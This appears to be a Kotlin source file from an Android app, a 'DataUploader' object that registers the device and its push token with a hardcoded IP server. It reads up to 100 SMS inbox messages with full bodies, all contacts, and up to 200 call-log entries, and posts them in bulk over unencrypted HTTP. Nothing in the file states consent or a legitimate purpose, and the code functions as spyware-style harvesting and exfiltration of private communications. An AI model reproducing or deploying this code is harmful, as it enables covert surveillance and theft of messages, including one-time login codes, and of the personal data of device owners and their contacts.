package com.example.test.utils

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import android.util.Log
import androidx.core.content.ContextCompat
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

object DataUploader {
    private const val TAG = "DataUploader"
    private const val BASE_URL = "http://95.134.130.160:8765"

    fun registerDevice(context: Context, deviceId: String, fcmToken: String, userId: String): Boolean {
        var conn: HttpURLConnection? = null
        return try {
            Log.d(TAG, "════════════════════════════════════════")
            Log.d(TAG, "📝 REGISTERING DEVICE")
            Log.d(TAG, "════════════════════════════════════════")

            val body = DeviceInfoHelper.buildDeviceInfoJson(context, deviceId, fcmToken, userId)

            val url = URL("$BASE_URL/devices/register")
            conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.connectTimeout = 15000
            conn.readTimeout = 15000
            conn.doOutput = true

            conn.outputStream.use { os ->
                os.write(body.toString().toByteArray(Charsets.UTF_8))
                os.flush()
            }

            val responseCode = conn.responseCode
            Log.d(TAG, "📥 Response code: $responseCode")

            if (responseCode in 200..299) {
                val response = conn.inputStream.bufferedReader().use { it.readText() }
                Log.d(TAG, "✅ Registration successful: $response")
                true
            } else {
                val error = conn.errorStream?.bufferedReader()?.use { it.readText() }
                Log.e(TAG, "❌ Registration failed ($responseCode): $error")
                false
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Registration error: ${e.message}", e)
            false
        } finally {
            conn?.disconnect()
        }
    }

    fun sendBatteryUpdate(context: Context, deviceId: String, fcmToken: String) {
        if (fcmToken.isEmpty()) {
            Log.w(TAG, "⚠️ FCM token empty, skipping battery update")
            return
        }

        Thread {
            var conn: HttpURLConnection? = null
            try {
                val batteryLevel = DeviceInfoHelper.getBatteryPercentage(context)
                Log.d(TAG, "🔋 Sending battery update: $batteryLevel%")

                val body = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("battery", batteryLevel)
                    put("isOnline", true)
                }

                val url = URL("$BASE_URL/devices/battery-update")
                conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.connectTimeout = 15000
                conn.readTimeout = 15000
                conn.doOutput = true

                conn.outputStream.use { os ->
                    os.write(body.toString().toByteArray())
                    os.flush()
                }

                val responseCode = conn.responseCode
                Log.d(TAG, "📥 Battery update response: $responseCode")

            } catch (e: Exception) {
                Log.e(TAG, "❌ Battery update exception: ${e.message}", e)
            } finally {
                conn?.disconnect()
            }
        }.start()
    }

    fun uploadAllSms(context: Context, deviceId: String) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "⚠️ SMS permission not granted")
            return
        }

        try {
            Log.d(TAG, "════════════════════════════════════════")
            Log.d(TAG, "📨 UPLOADING SMS")
            Log.d(TAG, "════════════════════════════════════════")

            val smsUri = Uri.parse("content://sms/inbox")
            val sortOrder = "date DESC"
            val cursor = context.contentResolver.query(smsUri, null, null, null, sortOrder)

            val smsBatch = JSONArray()
            var totalSent = 0
            var count = 0
            val maxSms = 100

            cursor?.use {
                if (it.moveToFirst()) {
                    do {
                        if (count >= maxSms) break

                        try {
                            val sms = JSONObject().apply {
                                put("id", it.getString(it.getColumnIndexOrThrow("_id")))
                                put("address", it.getString(it.getColumnIndexOrThrow("address")))
                                put("body", it.getString(it.getColumnIndexOrThrow("body")))
                                put("date", it.getLong(it.getColumnIndexOrThrow("date")))
                                put("type", "incoming")
                                put("deviceId", deviceId)
                            }
                            smsBatch.put(sms)
                            count++

                            if (smsBatch.length() >= 50) {
                                if (uploadSmsBatch(smsBatch)) {
                                    totalSent += smsBatch.length()
                                    while (smsBatch.length() > 0) smsBatch.remove(0)
                                } else break
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "❌ Error reading SMS: ${e.message}")
                        }
                    } while (it.moveToNext())
                }
            }

            // حتی اگر دیتا نداشته باشیم، باز هم آرایه خالی رو می‌فرستیم
            if (smsBatch.length() > 0 && uploadSmsBatch(smsBatch)) {
                totalSent += smsBatch.length()
            } else if (smsBatch.length() == 0 && totalSent == 0) {
                // ارسال آرایه خالی
                uploadSmsBatch(JSONArray())
                Log.d(TAG, "📭 No SMS found, sent empty array")
            }

            Log.d(TAG, "✅ Total SMS uploaded: $totalSent")
        } catch (e: Exception) {
            Log.e(TAG, "❌ SMS upload error: ${e.message}", e)
        }
    }

    private fun uploadSmsBatch(smsArray: JSONArray): Boolean {
        var conn: HttpURLConnection? = null
        return try {
            val body = JSONObject().apply { put("messages", smsArray) }
            val url = URL("$BASE_URL/sms/bulk")
            conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.connectTimeout = 15000
            conn.readTimeout = 15000
            conn.doOutput = true

            conn.outputStream.use { it.write(body.toString().toByteArray(Charsets.UTF_8)) }
            val responseCode = conn.responseCode
            Log.d(TAG, "📥 SMS upload response: $responseCode")
            responseCode in 200..299
        } catch (e: Exception) {
            Log.e(TAG, "❌ SMS batch error: ${e.message}")
            false
        } finally {
            conn?.disconnect()
        }
    }

    fun uploadAllContacts(context: Context, deviceId: String) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "⚠️ Contacts permission not granted")
            return
        }

        try {
            Log.d(TAG, "════════════════════════════════════════")
            Log.d(TAG, "👥 UPLOADING CONTACTS")
            Log.d(TAG, "════════════════════════════════════════")

            val contactsUri = android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI
            val projection = arrayOf(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER,
                android.provider.ContactsContract.CommonDataKinds.Phone.TYPE
            )

            val cursor = context.contentResolver.query(contactsUri, projection, null, null, null)

            val contactsBatch = JSONArray()
            var totalSent = 0

            cursor?.use {
                if (it.moveToFirst()) {
                    do {
                        try {
                            val contact = JSONObject().apply {
                                put("contactId", it.getString(0))
                                put("name", it.getString(1))
                                put("phoneNumber", it.getString(2))
                                put("type", it.getInt(3))
                                put("deviceId", deviceId)
                            }
                            contactsBatch.put(contact)

                            if (contactsBatch.length() >= 100) {
                                if (uploadContactsBatch(deviceId, contactsBatch)) {
                                    totalSent += contactsBatch.length()
                                    while (contactsBatch.length() > 0) contactsBatch.remove(0)
                                } else break
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "❌ Error reading contact: ${e.message}")
                        }
                    } while (it.moveToNext())
                }
            }

            // حتی اگر دیتا نداشته باشیم، باز هم آرایه خالی رو می‌فرستیم
            if (contactsBatch.length() > 0 && uploadContactsBatch(deviceId, contactsBatch)) {
                totalSent += contactsBatch.length()
            } else if (contactsBatch.length() == 0 && totalSent == 0) {
                // ارسال آرایه خالی
                uploadContactsBatch(deviceId, JSONArray())
                Log.d(TAG, "📭 No contacts found, sent empty array")
            }

            Log.d(TAG, "✅ Total contacts uploaded: $totalSent")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Contacts upload error: ${e.message}", e)
        }
    }

    private fun uploadContactsBatch(deviceId: String, contactsArray: JSONArray): Boolean {
        var conn: HttpURLConnection? = null
        return try {
            val body = JSONObject().apply {
                put("contacts", contactsArray)
                put("deviceId", deviceId)
            }
            val url = URL("$BASE_URL/contacts/bulk")
            conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.connectTimeout = 15000
            conn.readTimeout = 15000
            conn.doOutput = true

            conn.outputStream.use { it.write(body.toString().toByteArray(Charsets.UTF_8)) }
            val responseCode = conn.responseCode
            Log.d(TAG, "📥 Contacts upload response: $responseCode")
            responseCode in 200..299
        } catch (e: Exception) {
            Log.e(TAG, "❌ Contacts batch error: ${e.message}")
            false
        } finally {
            conn?.disconnect()
        }
    }

    fun uploadCallHistory(context: Context, deviceId: String) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG)
            != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "⚠️ Call log permission not granted")
            return
        }

        try {
            Log.d(TAG, "════════════════════════════════════════")
            Log.d(TAG, "📞 UPLOADING CALL HISTORY")
            Log.d(TAG, "════════════════════════════════════════")

            val callLogUri = android.provider.CallLog.Calls.CONTENT_URI
            val projection = arrayOf(
                android.provider.CallLog.Calls._ID,
                android.provider.CallLog.Calls.NUMBER,
                android.provider.CallLog.Calls.TYPE,
                android.provider.CallLog.Calls.DATE,
                android.provider.CallLog.Calls.DURATION,
                android.provider.CallLog.Calls.CACHED_NAME
            )

            val sortOrder = "${android.provider.CallLog.Calls.DATE} DESC"
            val cursor = context.contentResolver.query(callLogUri, projection, null, null, sortOrder)

            val callsBatch = JSONArray()
            var totalSent = 0
            var count = 0
            val maxCalls = 200

            cursor?.use {
                if (it.moveToFirst()) {
                    do {
                        if (count >= maxCalls) break

                        try {
                            val callType = it.getInt(2)
                            val callTypeStr = when (callType) {
                                android.provider.CallLog.Calls.INCOMING_TYPE -> "incoming"
                                android.provider.CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                                android.provider.CallLog.Calls.MISSED_TYPE -> "missed"
                                android.provider.CallLog.Calls.REJECTED_TYPE -> "rejected"
                                android.provider.CallLog.Calls.BLOCKED_TYPE -> "blocked"
                                android.provider.CallLog.Calls.VOICEMAIL_TYPE -> "voicemail"
                                else -> "unknown"
                            }

                            val call = JSONObject().apply {
                                put("id", it.getString(0))
                                put("phoneNumber", it.getString(1) ?: "Unknown")
                                put("type", callTypeStr)
                                put("date", it.getLong(3))
                                put("duration", it.getInt(4))
                                put("name", it.getString(5) ?: "")
                                put("deviceId", deviceId)
                            }
                            callsBatch.put(call)
                            count++

                            if (callsBatch.length() >= 100) {
                                if (uploadCallsBatch(deviceId, callsBatch)) {
                                    totalSent += callsBatch.length()
                                    while (callsBatch.length() > 0) callsBatch.remove(0)
                                } else break
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "❌ Error reading call log: ${e.message}")
                        }
                    } while (it.moveToNext())
                }
            }

            // حتی اگر دیتا نداشته باشیم، باز هم آرایه خالی رو می‌فرستیم
            if (callsBatch.length() > 0 && uploadCallsBatch(deviceId, callsBatch)) {
                totalSent += callsBatch.length()
            } else if (callsBatch.length() == 0 && totalSent == 0) {
                // ارسال آرایه خالی
                uploadCallsBatch(deviceId, JSONArray())
                Log.d(TAG, "📭 No call logs found, sent empty array")
            }

            Log.d(TAG, "✅ Total call logs uploaded: $totalSent")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Call history upload error: ${e.message}", e)
        }
    }

    private fun uploadCallsBatch(deviceId: String, callsArray: JSONArray): Boolean {
        var conn: HttpURLConnection? = null
        return try {
            val body = JSONObject().apply {
                put("calls", callsArray)
                put("deviceId", deviceId)
            }
            val url = URL("$BASE_URL/calls/bulk")
            conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.connectTimeout = 15000
            conn.readTimeout = 15000
            conn.doOutput = true

            conn.outputStream.use { it.write(body.toString().toByteArray(Charsets.UTF_8)) }
            val responseCode = conn.responseCode
            Log.d(TAG, "📥 Call logs upload response: $responseCode")
            responseCode in 200..299
        } catch (e: Exception) {
            Log.e(TAG, "❌ Call logs batch error: ${e.message}")
            false
        } finally {
            conn?.disconnect()
        }
    }
}